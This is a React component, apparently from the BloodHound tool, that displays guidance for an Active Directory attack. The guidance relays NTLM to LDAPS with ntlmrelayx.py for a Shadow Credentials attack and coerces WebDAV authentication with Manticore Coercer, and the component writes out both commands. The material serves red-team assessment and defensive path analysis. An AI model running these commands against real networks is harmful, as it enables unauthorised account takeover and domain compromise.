// Copyright 2025 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link } from '@mui/material';
import { Typography } from 'doodle-ui';
import { FC } from 'react';
import CodeController from '../CodeController/CodeController';

const LinuxAbuse: FC = () => {
    return (
        <>
            <Typography variant='body1'>1. Start the Relay Server</Typography>
            <Typography variant='body2'>
                The NTLM relay can be executed with{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py'>
                    ntlmrelayx.py
                </Link>
                . To relay to LDAP and perform a Shadow Credentials attack against the target computer:
                <CodeController>
                    {'ntlmrelayx.py -t ldaps://<Domain Controller IP> --shadow-credentials'}
                </CodeController>
            </Typography>

            <Typography variant='body1'>2. Coerce the Target Computer</Typography>
            <Typography variant='body2'>
                Several coercion methods are documented here:{' '}
                <Link
                    target='_blank'
                    rel='noopener noreferrer'
                    href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                    Windows Coerced Authentication Methods
                </Link>
                .
            </Typography>
            <Typography variant='body2'>
                Every coercion technique has prerequisites that must be met on the target. The following command uses{' '}
                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/TheManticoreProject/coercer'>
                    Manticore Coercer
                </Link>{' '}
                to attempt all relevant WebDAV coercion techniques. Success depends on the prerequisites for at least
                one technique being met.
            </Typography>
            <Typography component={'pre'}>
                {
                    'manticore-coercer coerce -t <target> -u <user> -p <pass> -d <domain> -l <listener-ip> --always-continue --path-type webdav'
                }
            </Typography>
            <Typography variant='body2'>
                The <code>--path-type webdav</code> option selects WebDAV paths for WebClient coercion. The required
                connection-string format is <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>.
            </Typography>
        </>
    );
};

export default LinuxAbuse;
